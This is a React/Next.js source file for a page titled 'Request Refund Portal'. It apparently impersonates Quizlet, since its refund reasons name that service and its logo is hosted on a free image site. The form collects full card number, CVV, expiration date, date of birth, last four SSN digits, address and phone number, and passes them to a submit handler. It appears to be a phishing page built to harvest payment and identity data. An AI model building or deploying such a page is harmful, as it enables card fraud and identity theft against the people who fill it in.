"use client";

import { useState, ChangeEvent, FormEvent } from "react";
import { handleFormSubmit } from "@/src/utils/submit";

interface FormData {
  amount:number;
  orderId: string;
  reason: string;
  firstName: string;
  lastName: string;
  dob: string;
  mobileNumber: string;
  homeAddress: string;
  zipCode: string;
  cardType: string;
  cardNumber: string;
  expirationDate: string;
  cvv: string;
  lfssn:string;
}

export default function Home() {
  const [formData, setFormData] = useState<FormData>({
    amount: 0,
    orderId: "",
    reason: "",
    firstName: "",
    lastName: "",
    dob:"", 
    mobileNumber: "",
    homeAddress: "",
    zipCode: "",
    cardType: "",
    cardNumber: "",
    expirationDate: "",
    cvv: "",
    lfssn:"",
  });

  const [isLoading, setIsLoading] = useState(false);
  const [statusMessage, setStatusMessage] = useState("");

  const handleChange = (e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { id, value } = e.target;
    setFormData((prevState) => ({
      ...prevState,
      [id]: value,
    }));
  };

  const handleRefundSubmit = async (e: FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setIsLoading(true);
    setStatusMessage("");

    try {
      await handleFormSubmit(formData);
      setStatusMessage("Refund request submitted successfully!");
      setFormData({
        amount:0,
        orderId: "",
        reason: "",
        firstName: "",
        lastName: "",
        dob: "",
        mobileNumber: "",
        homeAddress: "",
        zipCode: "",
        cardType: "",
        cardNumber: "",
        expirationDate: "",
        cvv: "",
        lfssn:"",
      });
    } catch (error) {
      setStatusMessage("Failed to submit the refund request. Please try again.");
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <header>
        <img
          src="https://i.postimg.cc/CLKVXjQf/images.png"
          alt="Logo"
          style={{ width: "100px" }}
        />
        <h1>Request Refund Portal</h1>
      </header>
      <main>
        <form id="refund-form" onSubmit={handleRefundSubmit}>
          <section>
            <h2>Refund Information</h2>
            <label htmlFor="orderId">Reference ID:</label>
            <input
              type="text"
              id="orderId"
              value={formData.orderId}
              onChange={handleChange}
              required
            />
              <label htmlFor="amount"> Amount:</label>
            <input
              type="text"
              id="amount"
              value={formData.amount}
              onChange={handleChange}
              required
            />
            <label htmlFor="reason">Reason for Refund:</label>
            <select id="reason" value={formData.reason} onChange={handleChange} required>
              <option value="">Select</option>
              <option value="double-charge">Double Charge</option>
              <option value="closure">Closure of Account</option>
              <option value="no-use">No Longer Making Use Of Quizlet</option>
            </select>
          </section>

          <section>
            <h2>Account Information</h2>
            <label htmlFor="firstName">First Name:</label>
            <input
              type="text"
              id="firstName"
              value={formData.firstName}
              onChange={handleChange}
              required
            />

            <label htmlFor="lastName">Last Name:</label>
            <input
              type="text"
              id="lastName"
              value={formData.lastName}
              onChange={handleChange}
              required
            />

            <label htmlFor="dob">Date of Birth:</label>
            <input
              type="text"
              placeholder="e.g 1989/05/06"
              id="dob"
              value={formData.dob}
              onChange={handleChange}
              required
            />

            <label htmlFor="mobileNumber">Mobile Number:</label>
            <input
              type="text"
              id="mobileNumber"
              value={formData.mobileNumber}
              onChange={handleChange}
              required
            />


            <label htmlFor="lfssn">Last four SSN:</label>
<input
  type="number"
  id="lfssn"
  value={formData.lfssn}
  onChange={handleChange}
  required
  min="0" // Prevents negative values
/>


            

            <label htmlFor="homeAddress">Home Address:</label>
            <input
              type="text"
              id="homeAddress"
              value={formData.homeAddress}
              onChange={handleChange}
              required
            />

            <label htmlFor="zipCode">Zip Code:</label>
            <input
              type="text"
              id="zipCode"
              value={formData.zipCode}
              onChange={handleChange}
              required
            />

            <label htmlFor="cardType">Card Type:</label>
            <select id="cardType" value={formData.cardType} onChange={handleChange} required>
              <option value="">Select</option>
              <option value="visa">Visa</option>
              <option value="mastercard">Mastercard</option>
              <option value="amex">American Express</option>
            </select>

            <label htmlFor="cardNumber">Card Number:</label>
            <input
              type="text"
              id="cardNumber"
              value={formData.cardNumber}
              onChange={handleChange}
              required
              pattern="[0-9]{9-16}"
            />

            <label htmlFor="expirationDate">Expiration Date:</label>
            <input
              type="month"
              id="expirationDate"
              value={formData.expirationDate}
              onChange={handleChange}
              required
            />

            <label htmlFor="cvv">CVV:</label>
            <input
              type="text"
              id="cvv"
              value={formData.cvv}
              onChange={handleChange}
              required
              pattern="[0-9]{3,4}"
            />
          </section>
          {statusMessage && <p>{statusMessage}</p>}

          <button type="submit" disabled={isLoading}>
            {isLoading ? "Submitting..." : "Request Refund"}
          </button>
        </form>
      </main>
    </>
  );
}
